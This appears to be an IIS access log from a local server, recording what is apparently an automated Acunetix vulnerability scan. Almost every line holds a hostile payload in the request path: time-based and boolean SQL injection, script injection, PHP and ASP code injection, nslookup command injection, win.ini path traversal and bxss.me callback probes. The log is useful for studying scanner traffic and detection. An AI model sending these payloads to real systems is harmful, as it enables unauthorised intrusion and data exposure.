127.0.0.1, -, 3/23/2019, 1:48:12, W3SVC2, FIREPLACE, 127.0.0.1, 33, 178, 5299, 404, 2, GET, /downloads/site.tar, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 347, 5401, 404, 0, GET, /-1' OR 2+487-487-1=0+0+0+1 -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 292, 5385, 404, 2, GET, /downloads/";print(md5(acunetix_wvs_security_test));$a=".html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 251, 2118, 200, 0, GET, /, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 347, 5401, 404, 0, GET, /-1' OR 3+487-487-1=0+0+0+1 -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 254, 5301, 404, 2, GET, /www.vulnweb.com/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 278, 5289, 404, 2, GET, /?'?"/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 289, 5379, 404, 2, GET, /downloads/${@print(md5(acunetix_wvs_security_test))}.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 361, 5425, 404, 0, GET, /-1' OR 2+730-730-1=0+0+0+1 or 'vfgDAIgp'='/endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 1, 251, 2118, 200, 0, GET, /, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5301, 404, 2, GET, /www.vulnweb.com/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 5331, 404, 2, GET, /(select convert(int,CHAR(65)))/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 361, 5425, 404, 0, GET, /-1' OR 3+730-730-1=0+0+0+1 or 'vfgDAIgp'='/endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 255, 5305, 404, 2, GET, /downloads/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 292, 5381, 404, 2, GET, /downloads/${@print(md5(acunetix_wvs_security_test))}/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 349, 5411, 404, 0, GET, /-1" OR 2+250-250-1=0+0+0+1 -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5315, 404, 2, GET, /downloads/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 349, 5411, 404, 0, GET, /-1" OR 3+250-250-1=0+0+0+1 -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 1, 267, 5327, 404, 2, GET, /http:/hitimwAjBwYIr.bxss.me/endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 1, 271, 5291, 404, 2, GET, /downloads/1'".html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 433, 5515, 404, 2, GET, /if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 277, 5351, 404, 2, GET, /project/;print(md5(acunetix_wvs_security_test));.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 281, 5305, 404, 2, GET, /downloads/WEB-INF/web.xml.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 425, 5587, 404, 0, GET, /(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'"+(select(0)from(select(sleep(9)))v)+"*/endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 245, 5287, 404, 2, GET, /downloads/952746.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5361, 404, 2, GET, /project/';print(md5(acunetix_wvs_security_test));$a='.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 336, 5327, 404, 2, GET, /1 waitfor delay '0:0:3' -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5381, 404, 2, GET, /project/";print(md5(acunetix_wvs_security_test));$a=".html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 261, 2118, 200, 0, GET, /, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 345, 5345, 404, 2, GET, /MKEeD4D1'; waitfor delay '0:0:3' -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 287, 5375, 404, 2, GET, /project/${@print(md5(acunetix_wvs_security_test))}.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 261, 5317, 404, 2, GET, /downloads/http:/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 243, 2118, 200, 0, GET, /, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 269, 5275, 404, 2, GET, /downloads/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5377, 404, 2, GET, /project/${@print(md5(acunetix_wvs_security_test))}/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5305, 404, 2, GET, /downloads/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 277, 5289, 404, 2, GET, /downloads/@@uQvOA.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 258, 5305, 404, 2, GET, /downloads/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 1, 283, 5305, 404, 2, GET, /downloads/WEB-INF/web.xml.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 272, 5283, 404, 2, GET, /downloads/JyI=.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 253, 5301, 404, 2, GET, /project/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 1, 243, 5283, 404, 2, GET, /project/914641.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 1, 251, 2118, 200, 0, GET, /, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 276, 5279, 404, 2, GET, /downloads/??.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 280, 5293, 404, 2, GET, /downloads/?'?".html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 415, 5449, 404, 2, GET, /downloads<ScR<ScRiPt>IpT>Vdfm(9443)</sCr<ScRiPt>IpT>/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 346, 5347, 404, 2, GET, /w5g7Ikfd'); waitfor delay '0:0:3' -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 1, 300, 5335, 404, 2, GET, /downloads/(select convert(int,CHAR(65))).html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 259, 5313, 404, 2, GET, /project/http:/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 428, 5449, 404, 2, GET, /project/喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡windows蜡win.ini.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 254, 5301, 404, 2, GET, /project/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5331, 404, 2, GET, /project/................windowswin.ini.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 284, 5311, 404, 2, GET, /project/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 347, 5349, 404, 2, GET, /99Tg5CtY')); waitfor delay '0:0:3' -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 269, 5287, 404, 2, GET, /project/1'".html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 334, 5301, 404, 2, GET, /project/windows/win.ini.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 338, 5339, 404, 2, GET, /wBHSDxkr';select pg_sleep(6); -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 267, 5271, 404, 2, GET, /project/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 279, 5301, 404, 2, GET, /project/WEB-INF/web.xml.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5301, 404, 2, GET, /project/www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 339, 5341, 404, 2, GET, /9rrq8jlb');select pg_sleep(6); -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 340, 5343, 404, 2, GET, /cGwMLqME'));select pg_sleep(9); -- /endpoint.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 281, 5301, 404, 2, GET, /project/WEB-INF/web.xml.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 275, 5285, 404, 2, GET, /project/@@CQmRg.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 1, 270, 5279, 404, 2, GET, /project/JyI=.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 307, 5289, 404, 2, GET, /downloads/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 274, 5275, 404, 2, GET, /project/??.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 278, 5289, 404, 2, GET, /project/?'?".html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 260, 5317, 404, 2, GET, /response.write(9296743*9260805).html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 5331, 404, 2, GET, /project/(select convert(int,CHAR(65))).html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 244, 5285, 404, 2, GET, /set|set&set.html, -,
127.0.0.1, -, 3/24/2019, 19:05:08, W3SVC2, FIREPLACE, 127.0.0.1, 0, 307, 5289, 404, 2, GET, /downloads/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 1990, 200, 0, GET, /resource.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 306, 5287, 404, 2, GET, /DCYuZfmm/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 253, 5295, 404, 2, GET, /$(nslookup AbhDFRtY).html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 343, 5393, 404, 0, GET, /-1 OR 2+65-65-1=0+0+0+1 -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 268, 5393, 404, 0, GET, /'+response.write(9296743*9260805)+'.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 343, 5393, 404, 0, GET, /-1 OR 3+65-65-1=0+0+0+1 -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 1990, 200, 0, GET, /resource.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 294, 5387, 404, 2, GET, /&nslookup nKZsCukk&'/"`0&nslookup nKZsCukk&`'.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 337, 5389, 404, 0, GET, /-1 OR 2+388-388-1=0+0+0+1/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 5271, 404, 2, GET, /rmaCg4OY.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 446, 5571, 404, 0, GET, /%64%6F%77%6E%6C%6F%61%64%73%3C%53%63%52%69%50%74%20%3E%56%64%66%6D%289639%29%3C%2F%73%43%72%69%70%54%3E/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 337, 5389, 404, 0, GET, /-1 OR 3+388-388-1=0+0+0+1/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 264, 5271, 404, 2, GET, /fTCUJDss.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 342, 5335, 404, 2, GET, /resource' AND 2*3*8=6*8 AND 'uMMm'='uMMm.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 272, 5413, 404, 0, GET, /"+response.write(9296743*9260805)+".html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 350, 5375, 404, 2, GET, /resource" AND 2*3*8=6*8 AND "3eV6"="3eV6.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 264, 1990, 200, 0, GET, /resource.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 346, 5399, 404, 0, GET, /-1' OR 2+887-887-1=0+0+0+1 -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 328, 5399, 404, 2, GET, /downloads/u003CScRiPt/Vdfm(9954)/u003C/sCripT/u003E/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 266, 5325, 404, 2, GET, /http:/hitLViElN5pF5.bxss.me/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 333, 5403, 404, 2, GET, /http:/some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 346, 5399, 404, 0, GET, /-1' OR 3+887-887-1=0+0+0+1 -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 351, 5341, 404, 2, GET, /resource%' AND 2*3*8=6*8 AND 'vtZD'!='vtZD%.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 257, 5383, 404, 0, GET, /${10000496+10000181}.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 292, 5325, 404, 2, GET, /Http:/testasp.vulnweb.com/t/fit.txt.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 256, 5255, 404, 2, GET, /.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 360, 5423, 404, 0, GET, /-1' OR 2+841-841-1=0+0+0+1 or 'nuog6SWd'='/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 424, 5499, 404, 2, GET, /if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 299, 5335, 404, 2, GET, /http:/testasp.vulnweb.com/t/fit.txt?.jpg.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 243, 5279, 404, 2, GET, /Y3ZvYnZZQTk=.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 416, 5571, 404, 0, GET, /(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 360, 5423, 404, 0, GET, /-1' OR 3+841-841-1=0+0+0+1 or 'nuog6SWd'='/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 333, 5425, 404, 2, GET, /downloads&lt;ScRiPt&gt;Vdfm(9174)&lt;/sCripT&gt;/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 275, 5293, 404, 2, GET, /testasp.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 257, 5257, 404, 2, GET, /).html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 346, 5405, 404, 0, GET, /-1" OR 2+42-42-1=0+0+0+1 -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 269, 5335, 404, 2, GET, /;print(md5(acunetix_wvs_security_test));.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 257, 5311, 404, 2, GET, /resource&n946076=v997660.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 346, 5405, 404, 0, GET, /-1" OR 3+42-42-1=0+0+0+1 -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 326, 5365, 404, 2, GET, /?img acu onmouseover=Vdfm(9708) /?/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 282, 5295, 404, 2, GET, /!(()&&!|*|*|.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 278, 5411, 404, 0, GET, /http:/testasp.vulnweb.com/t/xss.html?%00.jpg.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 1, 278, 5345, 404, 2, GET, /';print(md5(acunetix_wvs_security_test));$a='.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 290, 5295, 404, 2, GET, /^(#$!@#$)(()))******.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 282, 5365, 404, 2, GET, /";print(md5(acunetix_wvs_security_test));$a=".html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 432, 5513, 404, 2, GET, /if(now()=sysdate(),sleep(4),0)/*'XOR(if(now()=sysdate(),sleep(4),0))OR'"XOR(if(now()=sysdate(),sleep(4),0))OR"*/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 258, 5311, 404, 2, GET, /http:/hitgAddfPjbBZ.bxss.me/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 424, 5585, 404, 0, GET, /(select(0)from(select(sleep(4)))v)/*'+(select(0)from(select(sleep(4)))v)+'"+(select(0)from(select(sleep(4)))v)+"*/httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 279, 5359, 404, 2, GET, /${@print(md5(acunetix_wvs_security_test))}.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 335, 5325, 404, 2, GET, /1 waitfor delay '0:0:4' -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 327, 5309, 404, 2, GET, /1 waitfor delay '0:0:2' -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 420, 5433, 404, 2, GET, /喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡喇喇蜡windows蜡win.ini.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 344, 5343, 404, 2, GET, /lGIahvLO'; waitfor delay '0:0:4' -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 336, 5327, 404, 2, GET, /F3UhhYLb'; waitfor delay '0:0:2' -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 321, 5363, 404, 2, GET, /[url=http:/www.vulnweb.com][/url]/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 286, 5315, 404, 2, GET, /................windowswin.ini.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 337, 5329, 404, 2, GET, /6yEfdwQq'); waitfor delay '0:0:4' -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 282, 5361, 404, 2, GET, /${@print(md5(acunetix_wvs_security_test))}/.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 345, 5345, 404, 2, GET, /rSBcw0En'); waitfor delay '0:0:8' -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 329, 5419, 404, 2, GET, /downloads}body{acu:Expre/**/SSion(Vdfm(9165))}/endpoint_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 298, 5393, 404, 2, GET, /))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))).html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 338, 5331, 404, 2, GET, /3X7tCxH3')); waitfor delay '0:0:4' -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 346, 5347, 404, 2, GET, /zxwJndjs')); waitfor delay '0:0:8' -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 245, 5285, 404, 2, GET, /www.vulnweb.com.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 329, 5321, 404, 2, GET, /pl8yUIQc';select pg_sleep(4); -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 337, 5337, 404, 2, GET, /hZXcglzQ';select pg_sleep(8); -- /httpbot.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 9, 271, 4243, 200, 0, GET, /arm_instruction.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 235, 5267, 404, 2, GET, /919584.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 261, 5271, 404, 2, GET, /1'".html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 326, 5285, 404, 2, GET, /windows/win.ini.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 259, 5255, 404, 2, GET, /.html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 330, 5323, 404, 2, GET, /IazoWxxb');select pg_sleep(6); -- .html, -,
127.0.0.1, -, 3/24/2019, 19:05:09, W3SVC2, FIREPLACE, 127.0.0.1, 0, 339, 5341, 404, 2, GET, /QJHK9iv7');select pg_sleep(12); -- /httpbot.html, -,
